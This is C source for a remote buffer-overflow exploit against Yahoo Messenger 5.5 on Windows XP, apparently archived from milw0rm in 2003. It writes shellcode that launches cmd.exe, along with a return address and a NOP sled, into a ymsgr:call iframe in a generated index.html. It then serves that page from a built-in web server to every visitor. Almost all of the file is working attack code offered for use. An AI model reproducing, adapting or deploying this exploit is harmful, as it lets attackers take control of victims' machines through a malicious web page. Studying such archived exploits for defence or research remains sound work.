/* 
*
* ---[ Remote yahoo Messenger V5.5 exploiter on Windows XP ]---
*
* Dtors Security Research (DSR)
* Code by: Rave
*
* The buffer looks like this
*
* |-<-<-<--|
* <Fillup x offset><JMP 0x3><EIP><NOPS><SHELLCODE>
* ^__________^ 
*
*
*/


#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h> /* These are the usual header files */
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#define MAXDATASIZE 555 /* Max number of bytes of data */
#define BACKLOG 200 /* Number of allowed connections */

static int port =80;

/* library entry inside msvcrt.dll to jmp 0xc (EB0C); */
char sraddress[8]="\x16\xd8\xE8\x77";

/* This shellcode just executes cmd.exe nothing special here..
* the victim gets a cmd shell on his desktop :) lol ! \
*/

unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x8b\xec\x55\x8b\xec\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x8d\x45\xf8\x50\xb8"

"\x44\x80\xbf\x77" // 0x78bf8044 <- adress of system()
"\xff\xd0"; // call system()



static int port;
void Usage(char *programName)
{
printf("\n\t\t---------------------------------------------------\n");
printf("\t\t\t\tDtors Security Research (DSR) \n");
printf("\t\t\t\tCode by: Rave\n");
printf("\t\t\t\tMail: rave@dtors.net\n");
printf("\t\t---------------------------------------------------\n\n");


/* Modify here to add your usage message when the program is
* called without arguments */
printf("\t\t---------------------------------------------------\n\n");
fprintf(stdout,"\t\t-P local webserver server portnumber\n");
fprintf(stdout,"\t\t-g greatz to:\n\n\n\n\n");
printf("\t\t---------------------------------------------------\n\n");

}

/* returns the index of the first argument that is not an option; i.e.
does not start with a dash or a slash
*/
int HandleOptions(int argc,char *argv[])
{
int i,firstnonoption=0;

for (i=1; i< argc;i++) {
if (argv[i][0] == '/' || argv[i][0] == '-') {
switch (argv[i][1]) {
/* An argument -? means help is requested */
case '?':
Usage(argv[0]);
break;
case 'P':
port=atoi(argv[i+1]);break;
case 'H':
if (!stricmp(argv[i]+1,"help")) {
Usage(argv[0]);
break;
}
/* If the option -h means anything else
* in your application add code here
* Note: this falls through to the default
* to print an "unknow option" message
*/
/* add your option switches here */
default:
fprintf(stderr,"unknown option %s\n",argv[i]);
break;
}
}
else {
firstnonoption = i;
break;
}
}
return firstnonoption;
}

int main(int argc,char *argv[])
{
FILE *fptr;
unsigned char buffer[5000];
int offset=320; // <-- the offset off the buffer = 320 x NOP; (At 321 whe begin the instruction pointer change)
int fd,fd2 ,i,numbytes,sin_size; /* files descriptors */

char sd[MAXDATASIZE]; /* sd will store send text */

struct sockaddr_in server; /* server's address information */
struct sockaddr_in client; /* client's address information */
struct hostent *he; /* pointer for the host entry */


WSADATA wsdata;
WSAStartup(0x0101,&wsdata);


if (argc == 1) {
/* If no arguments we call the Usage routine and exit */
Usage(argv[0]);
return 1;
}

HandleOptions(argc,argv);
fprintf(stdout,"Creating index.html: ");
if ((fptr =fopen("index.html","w"))==NULL){
fprintf(stderr,"Failed\n");
exit(1);
} else {
fprintf(stderr,"Done\n");
}

// memseting the buffers for preperation
memset(sd,0x00,MAXDATASIZE);
memset(buffer,0x00,offset+32+strlen(shellcode));
memset(buffer,0x90,offset);


// whe place the a jmp ebp+0x3 instuction inside the buffer
// to jump over the eip changing bytes at the en offset
//
// <fillup x offset>jmp 0x3<eip><NOPS><shellcode>
// |____________^
buffer[offset-4]=0xeb;
buffer[offset-3]=0x03;

memcpy(buffer+offset,sraddress,4);
memcpy(buffer+offset+4,shellcode,strlen(shellcode));


// here whe make the index.html
// whe open it again if some one connects to the exploiting server
// and send it over to the victim.

fprintf(fptr,"<!DOCTYPE HTML PUBLIC %c-//W3C//DTD HTML 4.0 Transitional//EN%c>",0x22,0x22);
fprintf(fptr,"<html>");
fprintf(fptr,"<title>Oohhh my god exploited</title>\n");
fprintf(fptr,"<body bgcolor=%cblack%c>",0x22,0x22);
fprintf(fptr,"<body>");
fprintf(fptr,"<font color=%c#C0C0C0%c size=%c2%c face=%cverdana, arial, helvetica, sans-serif%c>",
0x22,0x22,0x22,0x22,0x22,0x22);
fprintf(fptr,"<B>Dtors Security Research (DSR)</B>\n");
fprintf(fptr,"<p>Yah000 Messager Version 5.5 exploit....</p>\n");
fprintf(fptr,"<pre>");
fprintf(fptr,"<IFRAME SRC=%cymsgr:call?%s%c>Contach heaven</html></body>\x00\x00\x00",0x22,buffer,0x22);
fprintf(fptr,"<IFRAME SRC=%chttp://www.boothill-mc.com/images/skull-modsm_01.gif%c>....</html>
</body>\x00\x00\x00",0x22,0x22);

fclose(fptr); // <-- closing index.html again


// Some extra debuging information
fprintf(stdout,"Using port: %d\n",port);
fprintf(stdout,"\nStarting server http://localhost:%d: ",port);

if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){ /* calls socket() */
printf("socket() error\n");
exit(1);} else {
fprintf(stderr,"Done\n");
}


server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = INADDR_ANY; /* INADDR_ANY puts your IP address automatically */
memset(server.sin_zero,0,8); /* zero the rest of the structure*/


if(bind(fd,(struct sockaddr*)&server,sizeof(struct sockaddr))==-1){
/* calls bind() */
printf("bind() error\n");
exit(-1);
}

if(listen(fd,BACKLOG) == -1){ /* calls listen() */
printf("listen() error\n");
exit(-1);
}

while(1){
sin_size=sizeof(struct sockaddr_in);
if ((fd2 = accept(fd,(struct sockaddr *)&client,&sin_size))==-1){
/* calls accept() */
printf("accept() error\n");
exit(1);
}

if ((he=gethostbyname(inet_ntoa(client.sin_addr)))==NULL){
printf("gethostbyname() error\n");
exit(-1);
}

printf("You got a connection from %s (%s)\n",
inet_ntoa(client.sin_addr),he->h_name);
/* prints client's IP */


fprintf(stdout,"\nOpening index.html for remote user: ");
if ((fptr =fopen("index.html","r"))==NULL){
fprintf(stderr,"Failed\n");
exit(1);
} else {
fprintf(stderr,"Done\n");
}

fprintf(stdout,"Sending the overflow string... ");


// reading the index.html file and sending its
// contents to the connected victim

while (!feof(fptr)) {
send(fd2,sd,strlen(sd),0);
numbytes=fread(sd,sizeof(char),MAXDATASIZE,fptr);
sd[numbytes * sizeof(char)]='\0';


}


send(fd2,sd,strlen(sd),0);


printf("\n\n\nExploit Done....\n\n\n");
printf("A shell is started @ %s :) lol\n\n\nPress any key to exit the exploit",inet_ntoa(client.sin_addr),he->h_name);

gets(sd);
exit(0);
}

return 0;
}


// milw0rm.com [2003-06-23]
